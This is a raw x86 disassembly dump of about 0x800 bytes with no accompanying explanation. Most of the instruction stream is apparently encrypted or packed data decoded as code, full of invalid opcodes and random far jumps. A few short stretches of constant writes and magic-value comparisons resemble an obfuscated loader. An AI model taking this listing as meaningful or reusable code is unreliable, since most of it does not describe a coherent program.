  40202a:	mov    eax,0x9632a12a
  40202f:	mov    DWORD PTR [esi],esi
  402031:	mov    al,0xd0
  402033:	inc    ebx
  402034:	cmp    dl,BYTE PTR [ecx]
  402036:	xor    DWORD PTR [edi-0x51],esp
  402039:	sbb    al,0xb0
  40203b:	call   0xddb1:0x5277b277
  402042:	jno    0x40208a
  402044:	pop    ebp
  402045:	cmp    bl,BYTE PTR [edx+0x2f7827ce]
  40204b:	cmp    DWORD PTR [ecx],eax
  40204d:	jge    0x40205e
  40204f:	adc    ebp,edx
  402051:	shl    DWORD PTR [ecx-0x5e6d0824],1
  402057:	sbb    eax,0xd79f46cf
  40205c:	test   al,0x4
  40205e:	fbld   TBYTE PTR [esi]
  402060:	xor    DWORD PTR [edx-0x61],ebx
  402063:	into   
  402064:	mov    dh,0xff
  402066:	push   eax
  402067:	mov    ch,0xb6
  402069:	jne    0x40208a
  40206b:	dec    edi
  40206c:	jo     0x40202e
  40206e:	stc    
  40206f:	out    dx,al
  402070:	xchg   BYTE PTR [ebx+0x45c7e055],cl
  402076:	aam    0xb9
  402078:	dec    esi
  402079:	add    BYTE PTR [eax],al
  40207b:	mov    DWORD PTR ds:0x42eea4,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e7da,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e7e2,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi+0x7329b31],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x402117
  4020cf:	add    ch,BYTE PTR [ebx]
  4020d1:	pop    ds
  4020d2:	int    0xec
  4020d4:	je     0x40210e
  4020d6:	add    cl,BYTE PTR [esi-0x11]
  4020d9:	call   0xe0c0:0xa40e7da4
  4020e0:	shl    bh,0xbf
  4020e3:	(bad)  
  4020e4:	stc    
  4020e5:	push   0x9f71188d
  4020ea:	call   0x1922:0x62efa49
  4020f1:	sbb    eax,0xc2d9a686
  4020f6:	sbb    al,0xb6
  4020f8:	push   eax
  4020f9:	imul   edi,DWORD PTR [edx*1-0x5f0a014f],0x1e
  402101:	enter  0x22f0,0xcd
  402105:	inc    ecx
  402106:	cmp    al,0x87
  402108:	les    esi,FWORD PTR [ebx]
  40210a:	or     DWORD PTR [edi+edx*8-0x514916d3],edi
  402111:	scas   al,BYTE PTR es:[edi]
  402112:	inc    edi
  402113:	push   esp
  402114:	aaa    
  402115:	inc    esi
  402116:	call   0x86688a33
  40211b:	adc    BYTE PTR [ecx],ch
  40211d:	jmp    0x24ae:0xf3737d74
  402124:	repnz xchg esp,eax
  402126:	cs pop eax
  402128:	lahf   
  402129:	in     al,dx
  40212a:	dec    esp
  40212b:	mov    cl,0xf9
  40212d:	(bad)  
  40212e:	sub    BYTE PTR [edi+0x2ca2391f],cl
  402134:	fild   WORD PTR [ecx+0x39fe910e]
  40213a:	sub    bh,BYTE PTR [esi+0x7a]
  40213d:	xor    edi,edi
  40213f:	add    dh,BYTE PTR [eax-0x58ac4dc7]
  402145:	xchg   ebp,eax
  402146:	fiadd  WORD PTR [edi-0x76]
  402149:	jb     0x4020dd
  40214b:	sbb    eax,esi
  40214d:	fldcw  WORD PTR [edi-0x9]
  402150:	retf   0x9346
  402153:	dec    esi
  402154:	or     ebx,DWORD PTR [edx+0x75]
  402157:	push   ds
  402158:	pusha  
  402159:	call   0xbf48:0x71e35117
  402160:	jg     0x4021a0
  402162:	push   es
  402163:	or     BYTE PTR [ecx+0x415114a0],ch
  402169:	sti    
  40216a:	out    dx,eax
  40216b:	mov    eax,0xae3f0410
  402170:	sbb    DWORD PTR [edi+0x6],0x7b
  402174:	mov    ds:0x22465d31,al
  402179:	and    eax,0x3a4dd68c
  40217e:	jmp    0x4021f9
  402180:	test   al,0x72
  402182:	das    
  402183:	int3   
  402184:	pop    ebp
  402185:	and    BYTE PTR [ebx-0x57],cl
  402188:	hlt    
  402189:	sub    DWORD PTR [edx*1+0x62bb568c],0x54
  402191:	gs sbb al,0xce
  402194:	in     al,dx
  402195:	pop    eax
  402196:	jb     0x40215a
  402198:	sbb    bh,dh
  40219a:	fsubp  st(0),st
  40219c:	shr    DWORD PTR [edi],0xd9
  40219f:	jb     0x402184
  4021a1:	rcr    DWORD PTR [edi-0x70069a0c],cl
  4021a7:	push   es
  4021a8:	scas   eax,DWORD PTR es:[edi]
  4021a9:	inc    esp
  4021aa:	or     DWORD PTR [edx],edx
  4021ac:	and    BYTE PTR [edx-0x25bee62a],0xbf
  4021b3:	(bad)  [ebp+0x25]
  4021b6:	sub    ebx,esi
  4021b8:	pop    es
  4021b9:	pop    es
  4021ba:	and    dl,al
  4021bc:	aaa    
  4021bd:	xchg   esp,eax
  4021be:	loopne 0x4021ed
  4021c0:	les    edx,FWORD PTR [ebp+eiz*8+0x26]
  4021c4:	mov    ecx,gs
  4021c6:	inc    esp
  4021c7:	push   es
  4021c8:	jp     0x4021ef
  4021ca:	popa   
  4021cb:	add    eax,0x8f4fde0f
  4021d0:	add    ch,dl
  4021d2:	adc    esp,DWORD PTR [ebp+0x3e45916f]
  4021d8:	fistp  QWORD PTR [ebp+0x7d]
  4021db:	jmp    0x3b22:0x76ca66
  4021e2:	push   0x30eae44
  4021e7:	jns    0x40221f
  4021e9:	retf   0xdbd9
  4021ec:	dec    ebp
  4021ed:	gs into 
  4021ef:	pop    eax
  4021f0:	mov    al,0x8
  4021f2:	jecxz  0x40218f
  4021f4:	jmp    0x40218e
  4021f6:	test   eax,0x460db652
  4021fb:	pop    esp
  4021fc:	and    edi,DWORD PTR [ebx-0x5994e14a]
  402202:	mov    dl,BYTE PTR [eax-0x72]
  402205:	lds    ebp,FWORD PTR [ecx-0x5da4560f]
  40220b:	call   0x667dc2ea
  402210:	mov    dh,0x18
  402212:	loopne 0x402275
  402214:	stos   DWORD PTR es:[edi],eax
  402215:	call   0x8c1c:0x1652cf5b
  40221c:	add    DWORD PTR [eax],ecx
  40221e:	scas   eax,DWORD PTR es:[edi]
  40221f:	aam    0x63
  402221:	xchg   edi,eax
  402222:	sar    BYTE PTR [esi],cl
  402224:	fiadd  DWORD PTR [esi+esi*4]
  402227:	fistp  QWORD PTR [ecx-0x67]
  40222a:	clc    
  40222b:	inc    eax
  40222c:	pop    ecx
  40222d:	lods   al,BYTE PTR ds:[esi]
  40222e:	dec    ecx
  40222f:	xchg   ecx,eax
  402230:	inc    ebp
  402231:	fwait
  402232:	int    0xe
  402234:	push   edx
  402235:	test   eax,0x5d5aa201
  40223a:	test   BYTE PTR [ebp-0x35],0xfd
  40223e:	idiv   DWORD PTR [ebp+ebx*4-0x9]
  402242:	sbb    esp,DWORD PTR [ecx+0xb]
  402245:	cmp    eax,0xb2431c91
  40224a:	jnp    0x402230
  40224c:	push   ecx
  40224d:	arpl   WORD PTR [ecx+ebx*4],bp
  402250:	mov    ebx,0xc99f720e
  402255:	mov    esi,0xfee0494f
  40225a:	mov    al,0xde
  40225c:	push   ebx
  40225d:	jne    0x402293
  40225f:	test   BYTE PTR [esi-0x7],dh
  402262:	sahf   
  402263:	icebp  
  402264:	xor    al,0x8d
  402266:	cmp    BYTE PTR [bp+si],ah
  402269:	cmp    eax,0x1472d81b
  40226e:	mov    ah,0x99
  402270:	call   0x214c:0x5b1e4340
  402277:	xor    eax,0x15ac98b9
  40227c:	add    al,BYTE PTR [esi+ebx*8]
  40227f:	mov    bh,0x49
  402281:	es sahf 
  402283:	pop    DWORD PTR [ebp-0x42]
  402286:	cmp    esp,DWORD PTR [ecx]
  402288:	(bad)  
  402289:	sti    
  40228a:	xor    BYTE PTR [ebx+0x53d90d72],ah
  402290:	icebp  
  402291:	mov    ebp,0xf6c89919
  402296:	imul   ebx
  402298:	jmp    0xd762eddb
  40229d:	sbb    DWORD PTR [ebx+0x61],esp
  4022a0:	aam    0x20
  4022a2:	ss fs popf 
  4022a5:	xchg   edx,eax
  4022a6:	in     eax,dx
  4022a7:	and    al,0x7a
  4022a9:	sti    
  4022aa:	sbb    al,0x9e
  4022ac:	mov    edx,DWORD PTR [bx+si+0x3eff]
  4022b1:	mov    ds:0xb1c90ef2,eax
  4022b6:	cs cmc 
  4022b8:	add    DWORD PTR [esi],ebp
  4022ba:	push   edi
  4022bb:	mov    ecx,0x99ad346d
  4022c0:	mov    WORD PTR [esi],ds
  4022c2:	push   cs
  4022c3:	and    DWORD PTR [ebp-0x895f6e2],0xffffff9f
  4022ca:	push   0x58
  4022cc:	fdivrp st(4),st
  4022ce:	pop    ebx
  4022cf:	push   0x6aecf93f
  4022d4:	add    dh,BYTE PTR [ecx]
  4022d6:	cmc    
  4022d7:	inc    ebp
  4022d8:	xchg   DWORD PTR [edi+0x20],ecx
  4022db:	mov    dh,0xd4
  4022dd:	push   cs
  4022de:	mov    al,ds:0x2e15a56e
  4022e3:	cwde   
  4022e4:	ins    DWORD PTR es:[edi],dx
  4022e5:	outs   dx,DWORD PTR ds:[esi]
  4022e6:	mov    esi,0x352d4579
  4022eb:	push   eax
  4022ec:	sbb    cl,ch
  4022ee:	sub    al,0xd7
  4022f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f1:	and    eax,0xe24dc439
  4022f6:	pop    es
  4022f7:	adc    bl,BYTE PTR [ebp+0x64f78978]
  4022fd:	sbb    ah,bl
  4022ff:	or     DWORD PTR [esi-0x55e528aa],eax
  402305:	imul   ecx,DWORD PTR [ebx+0x4f],0x41
  402309:	dec    ebp
  40230a:	xor    edi,DWORD PTR [esi-0x798acc1e]
  402310:	cmp    al,0x40
  402312:	add    DWORD PTR ds:0x898b3f52,eax
  402318:	ins    BYTE PTR es:[edi],dx
  402319:	xchg   ecx,eax
  40231a:	out    dx,al
  40231b:	lea    ebp,[ecx+0x2a]
  40231e:	lahf   
  40231f:	daa    
  402320:	add    eax,0x23ef7c9e
  402325:	xor    al,0x3
  402327:	ja     0x40232b
  402329:	sub    al,0xba
  40232b:	dec    ecx
  40232c:	mov    ?,WORD PTR [ebx+0x7]
  40232f:	fwait
  402330:	shr    DWORD PTR [ebx+esi*8],0x14
  402334:	sbb    al,0xde
  402336:	cld    
  402337:	enter  0xffc3,0xb9
  40233b:	dec    eax
  40233c:	test   eax,0x7fe5eda
  402341:	jg     0x4022c3
  402343:	fimul  DWORD PTR [edi]
  402345:	dec    esp
  402346:	add    al,0x3d
  402348:	lahf   
  402349:	jno    0x40237f
  40234b:	pop    edi
  40234c:	jns    0x402303
  40234e:	lahf   
  40234f:	push   0xffffffa9
  402351:	int3   
  402352:	js     0x40233e
  402354:	jecxz  0x402385
  402356:	pusha  
  402357:	outs   dx,DWORD PTR ds:[esi]
  402358:	iret   
  402359:	adc    eax,0x1ba24d53
  40235e:	fisub  DWORD PTR [ebp+0x3b]
  402361:	(bad)  
  402363:	ror    BYTE PTR [edx],cl
  402365:	(bad)  [edi]
  402367:	jb     0x4022f1
  402369:	mov    edx,0x6da9715f
  40236e:	and    bl,BYTE PTR [eax]
  402370:	pop    esi
  402371:	test   eax,0xe14389c
  402376:	ret    
  402377:	mov    edx,DWORD PTR [eax+0x1a]
  40237a:	das    
  40237b:	mov    dh,0x3f
  40237d:	(bad)  
  40237e:	data16 (bad) gs:[edx-0x60b65663]
  402386:	pop    eax
  402387:	add    ebp,edi
  402389:	inc    esi
  40238a:	and    eax,0xc03dc8db
  40238f:	push   eax
  402390:	rcr    DWORD PTR [ecx],0xcc
  402393:	fild   DWORD PTR [esp+esi*8-0x60]
  402397:	dec    ebp
  402398:	or     al,0xae
  40239a:	push   esi
  40239b:	xor    cl,BYTE PTR ds:0x3c7b67c5
  4023a1:	mov    dl,0x14
  4023a3:	adc    DWORD PTR [ecx-0x25],eax
  4023a6:	sbb    esi,DWORD PTR [esi]
  4023a8:	test   ch,dl
  4023aa:	pop    es
  4023ab:	adc    eax,0x3984b162
  4023b0:	inc    edi
  4023b1:	cwde   
  4023b2:	jmp    0x1f34d475
  4023b7:	sub    BYTE PTR [esi+0x43],dl
  4023ba:	loop   0x402354
  4023bc:	dec    eax
  4023bd:	je     0x40242b
  4023bf:	lods   eax,DWORD PTR ds:[esi]
  4023c0:	and    BYTE PTR [ecx+0x60],bh
  4023c3:	loope  0x4023dd
  4023c5:	sub    al,0x9a
  4023c7:	pop    ss
  4023c8:	cmp    BYTE PTR [edx+ebp*4+0x5b3ced52],al
  4023cf:	and    BYTE PTR [edi+esi*2],al
  4023d2:	out    0x36,al
  4023d4:	iret   
  4023d5:	mov    ds:0x5456a2f2,eax
  4023da:	test   BYTE PTR [edi+0x2bdbb537],bh
  4023e0:	push   cs
  4023e1:	aam    0xcf
  4023e3:	scas   eax,DWORD PTR es:[edi]
  4023e4:	jo     0x402388
  4023e6:	and    di,dx
  4023e9:	fs mov ah,0xe8
  4023ec:	mov    dh,0xca
  4023ee:	cmp    bh,ch
  4023f0:	and    DWORD PTR [ecx+0x477e0c97],ecx
  4023f6:	imul   ebx,DWORD PTR [edi-0x1c98839d],0xc56881f4
  402400:	(bad)  
  402401:	push   0x1f
  402403:	xchg   ecx,eax
  402404:	ds mov ch,0x3c
  402407:	add    al,0x70
  402409:	(bad)  
  40240a:	jecxz  0x4023c5
  40240c:	lods   eax,DWORD PTR ds:[esi]
  40240d:	push   0xce4e2656
  402412:	dec    esp
  402413:	sbb    ecx,DWORD PTR ds:0x42144f3c
  402419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40241a:	aas    
  40241b:	aaa    
  40241c:	call   0x95f1:0x307a9a38
  402423:	call   0x1493:0xdbf1a2c3
  40242a:	xlat   BYTE PTR ds:[ebx]
  40242b:	inc    edx
  40242c:	jecxz  0x4023d3
  40242e:	std    
  40242f:	or     BYTE PTR [ebx+0x52da29ac],0x57
  402436:	mov    ebp,0x53b6f672
  40243b:	push   0xffffffa7
  40243d:	cwde   
  40243e:	icebp  
  40243f:	adc    edx,DWORD PTR [ebp+0x13]
  402442:	dec    esi
  402443:	push   ebp
  402444:	mov    ds:0x49bd570f,eax
  402449:	sbb    bl,BYTE PTR [ebp+0x5912cd9b]
  40244f:	xor    BYTE PTR [esi],al
  402451:	lea    ecx,[eax]
  402453:	js     0x402479
  402455:	fstp   TBYTE PTR [ebx]
  402457:	inc    ebx
  402458:	push   cs
  402459:	xchg   ebp,eax
  40245a:	cwde   
  40245b:	mov    bh,ah
  40245d:	xor    ecx,DWORD PTR ds:[ebx+0x6d]
  402461:	inc    edx
  402462:	mov    edx,DWORD PTR [eax]
  402464:	imul   edx,edx,0xf89ea9ee
  40246a:	mov    DWORD PTR ds:0x4305c6,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x43053e,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x43053a,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	pop    esp
  4024b3:	adc    BYTE PTR ds:0x7e0f52e1,al
  4024b9:	jle    0x40243d
  4024bb:	jno    0x40253b
  4024bd:	jle    0x4024de
  4024bf:	inc    eax
  4024c0:	mov    ecx,0xd507a53e
  4024c5:	js     0x402476
  4024c7:	mov    bh,0x63
  4024c9:	lahf   
  4024ca:	arpl   WORD PTR [esi+0x4c9de634],ax
  4024d0:	fs mov al,0xa7
  4024d3:	xchg   esp,eax
  4024d4:	adc    al,0xc6
  4024d6:	aad    0xb1
  4024d8:	or     ch,BYTE PTR [ebx-0x9]
  4024db:	daa    
  4024dc:	mov    ecx,0x392a56ef
  4024e1:	(bad)  
  4024e2:	shl    al,0xae
  4024e5:	sub    BYTE PTR [ebx+0x1c],0x71
  4024e9:	ror    BYTE PTR [edi],cl
  4024eb:	ficomp DWORD PTR [ebx+0x7d]
  4024ee:	cld    
  4024ef:	jnp    0x402516
  4024f1:	mov    WORD PTR [edi],cs
  4024f3:	loope  0x402483
  4024f5:	xchg   esi,eax
  4024f6:	dec    ebp
  4024f7:	pop    esp
  4024f8:	pusha  
  4024f9:	push   ebp
  4024fa:	ret    
  4024fb:	pop    ss
  4024fc:	xchg   ebp,eax
  4024fd:	sahf   
  4024fe:	add    cl,BYTE PTR [esi+eiz*8-0x68]
  402502:	mov    bl,0x8a
  402504:	push   ds
  402505:	push   esp
  402506:	(bad)  
  402507:	(bad)  gs:[eax+0x46]
  40250b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40250d:	shr    DWORD PTR [eax-0x80],cl
  402510:	retf   
  402511:	inc    ecx
  402512:	pop    edi
  402513:	paddd  mm5,mm6
  402516:	into   
  402517:	ins    DWORD PTR es:[edi],dx
  402518:	mov    ds,esp
  40251a:	mov    ebp,DWORD PTR [edx]
  40251c:	jp     0x402599
  40251e:	jmp    0xf93878fc
  402523:	das    
  402524:	add    BYTE PTR [eax+0x4],dl
  402527:	mov    eax,0x5d929d55
  40252c:	test   BYTE PTR [esp+eax*4-0x5f],bh
  402530:	mov    bh,BYTE PTR [bx+si]
  402533:	test   eax,0xf4a3d2a8
  402538:	fld    TBYTE PTR [ebx-0x55]
  40253b:	push   0xf7528879
  402540:	(bad)  
  402541:	cmp    al,BYTE PTR [ecx]
  402543:	push   cs
  402544:	inc    ebp
  402545:	dec    esi
  402546:	and    ecx,DWORD PTR [ebx+0x17]
  402549:	xlat   BYTE PTR ds:[ebx]
  40254a:	adc    al,0x1c
  40254c:	pop    ebp
  40254d:	in     al,dx
  40254e:	frstor [ecx-0x6cffc9f7]
  402554:	inc    eax
  402555:	outs   dx,DWORD PTR ds:[esi]
  402556:	lahf   
  402557:	sar    DWORD PTR [esi],1
  402559:	add    ah,ah
  40255b:	bound  ecx,QWORD PTR [ebx+0x1c32aed9]
  402561:	cmp    DWORD PTR cs:[eax+0x1497e2a3],ebx
  402568:	cmp    DWORD PTR fs:[ebx-0x46],ecx
  40256c:	add    DWORD PTR [ebp-0x5d25904],edi
  402572:	sbb    BYTE PTR [esi],dh
  402574:	les    esp,FWORD PTR [ebx-0x6d]
  402577:	push   esp
  402578:	sbb    al,0xb9
  40257a:	cmp    eax,0xcc3553e7
  40257f:	jecxz  0x402505
  402581:	or     ch,BYTE PTR [ecx]
  402583:	xchg   DWORD PTR [ebp+0x3a6d80ad],edi
  402589:	push   0x10f5d9a9
  40258e:	sbb    al,al
  402590:	push   ecx
  402591:	xchg   ecx,eax
  402592:	push   ebx
  402593:	pushf  
  402594:	sar    DWORD PTR [esi+0x15],0x94
  402598:	adc    al,0x71
  40259a:	loop   0x4025a6
  40259c:	cs jge 0x4025a3
  40259f:	or     BYTE PTR [ecx],bh
  4025a1:	or     dh,BYTE PTR [ebp-0x5ab182c5]
  4025a7:	sbb    al,0xbd
  4025a9:	pop    ebx
  4025aa:	outs   dx,BYTE PTR ds:[esi]
  4025ab:	aaa    
  4025ac:	scas   al,BYTE PTR es:[edi]
  4025ad:	xchg   esp,eax
  4025ae:	inc    esi
  4025af:	jae    0x40260d
  4025b1:	inc    ecx
  4025b2:	in     eax,0x1d
  4025b4:	push   eax
  4025b5:	add    eax,0x5c29e248
  4025ba:	dec    eax
  4025bb:	popa   
  4025bc:	jp     0x4025f0
  4025be:	push   ds
  4025bf:	outs   dx,BYTE PTR ds:[esi]
  4025c0:	push   ss
  4025c1:	push   ecx
  4025c2:	icebp  
  4025c3:	push   0xffffff8c
  4025c5:	adc    eax,0x58d912e5
  4025ca:	sbb    BYTE PTR [ebp+0x29],0xbe
  4025ce:	pop    esi
  4025cf:	add    DWORD PTR [ebp+eax*1-0x3a766317],esp
  4025d6:	sub    DWORD PTR [esi+0x21],0xffffffc7
  4025da:	and    eax,0xc0a376a3
  4025df:	bound  ecx,QWORD PTR [ebp-0x18e9f9c3]
  4025e5:	sbb    eax,0xc4a7d8df
  4025ea:	push   edi
  4025eb:	push   edi
  4025ec:	out    dx,eax
  4025ed:	lods   eax,DWORD PTR es:[esi]
  4025ef:	xor    BYTE PTR [esi-0x7a],cl
  4025f2:	push   eax
  4025f4:	pop    edx
  4025f5:	sub    edx,DWORD PTR [edx-0x2669bb76]
  4025fb:	int    0xab
  4025fd:	cli    
  4025fe:	arpl   WORD PTR [eax],bx
  402600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402601:	outs   dx,BYTE PTR ds:[esi]
  402602:	push   ss
  402603:	sub    eax,0xd0d687
  402608:	scas   eax,DWORD PTR es:[edi]
  402609:	mov    esi,0x3e71b1e2
  40260e:	(bad)  
  40260f:	shl    BYTE PTR [ebx-0x33386708],1
  402615:	(bad)  
  402616:	jge    0x4025e6
  402618:	rcl    BYTE PTR [ecx+ebx*2],cl
  40261b:	inc    esp
  40261c:	pop    eax
  40261d:	in     al,0x79
  40261f:	aam    0x23
  402621:	outs   dx,BYTE PTR ds:[esi]
  402622:	in     eax,dx
  402623:	dec    edi
  402624:	jae    0x402628
  402626:	jecxz  0x40264d
  402628:	push   edi
  402629:	mov    edi,0x6288bf53
  40262e:	xchg   edi,eax
  40262f:	add    DWORD PTR [edx],edx
  402631:	ficom  DWORD PTR [ebx]
  402633:	iret   
  402634:	push   eax
  402635:	dec    ecx
  402636:	xlat   BYTE PTR ds:[ebx]
  402637:	fwait
  402638:	xor    BYTE PTR [edi],ch
  40263a:	push   0xe607b949
  40263f:	cdq    
  402640:	add    dh,BYTE PTR [esi+eax*2]
  402643:	inc    esp
  402644:	xchg   ebx,eax
  402645:	cmc    
  402646:	(bad)  
  402648:	inc    ecx
  402649:	ins    BYTE PTR es:[edi],dx
  40264a:	jmp    0x40265c
  40264c:	aam    0x8c
  40264e:	push   ebp
  40264f:	into   
  402650:	sbb    bl,BYTE PTR [ebp+0x12e09fcd]
  402656:	outs   dx,BYTE PTR ds:[esi]
  402657:	or     al,0xa3
  402659:	das    
  40265a:	pusha  
  40265b:	fdivr  DWORD PTR [eax-0xc]
  40265e:	ret    0x5f1e
  402661:	retf   0xcd27
  402664:	cmp    bl,ch
  402666:	and    ebp,DWORD PTR [ebx+0x60]
  402669:	push   esi
  40266a:	jne    0x4026af
  40266c:	add    ebp,DWORD PTR ds:0x79b138ba
  402672:	test   eax,0x60e34c72
  402677:	xrelease mov DWORD PTR [ebp+0x6bd90a2c],esi
  40267e:	pop    edx
  40267f:	jns    0x4026e5
  402681:	das    
  402682:	inc    ebx
  402683:	sub    bl,dl
  402685:	xchg   ebp,eax
  402686:	xor    edi,edi
  402688:	adc    ch,ah
  40268a:	sub    dh,0xdb
  40268d:	sub    eax,0xa5d57bf8
  402692:	stos   BYTE PTR es:[edi],al
  402693:	jecxz  0x402696
  402695:	jl     0x4026fe
  402697:	and    DWORD PTR [edi-0x67],ebx
  40269a:	push   esi
  40269b:	pop    ds
  40269c:	xchg   BYTE PTR [esi-0x747179c6],cl
  4026a2:	out    0xa9,al
  4026a4:	nop
  4026a5:	cwde   
  4026a6:	adc    cl,BYTE PTR [ebp+0x4d]
  4026a9:	pushf  
  4026aa:	cdq    
  4026ab:	imul   eax,DWORD PTR [ebx],0xffffffea
  4026ae:	xor    ch,dl
  4026b0:	push   esi
  4026b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026b2:	pop    edi
  4026b3:	pop    ds
  4026b4:	das    
  4026b5:	inc    esi
  4026b6:	je     0x402649
  4026b8:	add    al,0xdc
  4026ba:	fisttp QWORD PTR [ecx]
  4026bc:	sbb    ebx,DWORD PTR [edx-0x345f2723]
  4026c2:	aam    0x79
  4026c4:	sub    BYTE PTR [ebx],ch
  4026c6:	push   ebp
  4026c7:	fdivr  DWORD PTR [esi-0x37425c4]
  4026cd:	inc    ebx
  4026ce:	mov    ecx,DWORD PTR [edx]
  4026d0:	mov    ah,0x73
  4026d2:	mov    edx,0xbdc03e4d
  4026d7:	stos   BYTE PTR es:[edi],al
  4026d8:	cwde   
  4026d9:	jbe    0x4026ac
  4026db:	cmp    eax,0xbb363f99
  4026e0:	ret    
  4026e1:	sub    ch,0x25
  4026e4:	dec    edx
  4026e5:	je     0x4026b8
  4026e7:	sbb    eax,0xc8a6c48
  4026ec:	xor    dl,bh
  4026ee:	jbe    0x4026ea
  4026f0:	sbb    DWORD PTR [ecx],0xe508dcc1
  4026f6:	inc    ebx
  4026f7:	loope  0x40267a
  4026f9:	push   0xffffffeb
  4026fb:	paddsw mm1,QWORD PTR [edx+0x8]
  4026ff:	icebp  
  402700:	scas   eax,DWORD PTR es:[edi]
  402701:	sub    ebx,DWORD PTR [ecx+0x28]
  402704:	jg     0x4026c9
  402706:	(bad)  
  402707:	pushf  
  402708:	test   eax,0xf48b32d2
  40270d:	xchg   edi,eax
  40270e:	xlat   BYTE PTR ds:[ebx]
  40270f:	daa    
  402710:	pop    esi
  402711:	pop    esp
  402712:	pop    es
  402713:	xchg   ebp,eax
  402714:	xor    bh,BYTE PTR [eax]
  402716:	out    0x5a,al
  402718:	hlt    
  402719:	jl     0x402707
  40271b:	loopne 0x4026b3
  40271d:	push   0x1d
  40271f:	arpl   WORD PTR [ebx+0x7920196c],ax
  402725:	dec    eax
  402726:	pop    ecx
  402727:	ror    BYTE PTR [ebx-0x1a],0x16
  40272b:	loope  0x402719
  40272d:	adc    al,0xf0
  40272f:	int    0x90
  402731:	pop    es
  402732:	sub    esp,eax
  402734:	push   0x6a15e1be
  402739:	or     ebx,DWORD PTR [edx-0x50969956]
  40273f:	add    edi,0x855cf68f
  402745:	mov    esp,0x7f5421d9
  40274a:	jbe    0x40273f
  40274c:	shr    ebx,0x6c
  40274f:	retf   0xcc24
  402752:	rol    BYTE PTR [edi+0x10414414],0x92
  402759:	retf   0x57d9
  40275c:	push   es
  40275d:	mov    ch,0xf8
  40275f:	shl    DWORD PTR [edx*4-0x9d6abc9],cl
  402766:	shl    dl,cl
  402768:	pop    eax
  402769:	add    esp,edi
  40276b:	push   edx
  40276c:	adc    eax,0x8c088b52
  402771:	pop    eax
  402772:	inc    ecx
  402773:	adc    ebx,DWORD PTR [edx]
  402775:	mov    ah,0x25
  402777:	mov    bl,0x4f
  402779:	pop    ebx
  40277a:	mov    esp,0xf2847a
  40277f:	lods   al,BYTE PTR ds:[esi]
  402780:	add    BYTE PTR [edx-0x23],0xa5
  402784:	adc    eax,0xb8b69ce6
  402789:	cmp    ebx,DWORD PTR [edx+ebx*4-0x302bef63]
  402790:	sub    al,0x18
  402792:	out    dx,eax
  402793:	mov    ch,0x63
  402795:	xor    BYTE PTR [edi+0x798506c0],ch
  40279b:	int    0x2e
  40279d:	mov    DWORD PTR [edi+0x292b6b64],esi
  4027a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027a4:	test   al,0x22
  4027a6:	stos   DWORD PTR es:[edi],eax
  4027a7:	mov    esi,0x27eccefb
  4027ac:	mov    ah,0x6
  4027ae:	and    al,0xd0
  4027b0:	(bad)  
  4027b1:	dec    eax
  4027b2:	inc    ecx
  4027b3:	test   eax,0xfe51b141
  4027b8:	enter  0x9c0c,0xd7
  4027bc:	pop    esi
  4027bd:	dec    ebp
  4027be:	xchg   ebx,eax
  4027bf:	push   0xf8fc6b5b
  4027c4:	push   cs
  4027c5:	imul   eax,DWORD PTR [edx],0xffffffd2
  4027c8:	add    eax,0x45a5807e
  4027cd:	fidiv  WORD PTR [eax+0xb]
  4027d0:	bound  esi,QWORD PTR [ecx]
  4027d2:	pop    ebx
  4027d3:	mov    al,ds:0xa5c9bffb
  4027d8:	gs pop ds
  4027da:	cmp    eax,0xf3d83a9a
  4027df:	sbb    eax,0x629ab588
  4027e4:	cwde   
  4027e5:	xchg   edi,eax
  4027e6:	jmp    0x459f:0x129938
  4027ed:	call   0x4aafa7ee
  4027f2:	out    0x10,eax
  4027f4:	cmp    al,0xca
  4027f6:	cmp    ecx,edi
  4027f8:	hlt    
  4027f9:	ja     0x40280c
  4027fb:	out    0xe8,al
  4027fd:	mov    eax,0x1ec90aa
  402802:	shr    BYTE PTR [edi-0x9],cl
  402805:	xor    BYTE PTR [edx-0x36],al
  402808:	scas   al,BYTE PTR es:[edi]
  402809:	ja     0x40279f
  40280b:	inc    eax
  40280c:	cmp    al,0x64
  40280e:	call   0x4691a1de
  402813:	fist   DWORD PTR [edi]
  402815:	(bad)  
  402816:	xlat   BYTE PTR ds:[ebx]
  402817:	cmp    dl,BYTE PTR [esi]
  402819:	scas   al,BYTE PTR es:[edi]
  40281a:	xor    ah,BYTE PTR [esi+ecx*1-0x78800fe5]
  402821:	aad    0x1c
  402823:	mov    BYTE PTR es:[eax-0x1e],dl
  402827:	or     BYTE PTR [ebp+0x65dfc459],ah
  40282d:	test   al,0x9d
  40282f:	imul   DWORD PTR [ebx+0x166f25dc]
  402835:	imul   edi,DWORD PTR [eax-0x52],0xffffff92
  402839:	push   ebx
  40283a:	rcr    BYTE PTR ss:[ebp-0x217375ef],cl
  402841:	sub    eax,0xf74cf528
  402846:	xor    edx,ebp
